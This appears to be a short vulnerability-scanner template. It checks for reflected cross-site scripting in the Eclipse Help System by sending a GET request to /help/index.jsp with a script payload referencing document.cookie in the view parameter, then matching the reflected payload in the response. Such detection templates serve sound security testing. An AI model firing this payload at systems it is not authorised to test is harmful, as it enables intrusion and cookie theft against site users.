id: eclipse-help-system-xss

info:
  name: Eclipse Help System RXSS vulnerability
  author: pikpikcu
  severity: medium

requests:
  - method: GET
    path:
      - "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<script>alert(document.cookie)</script>"
        part: body
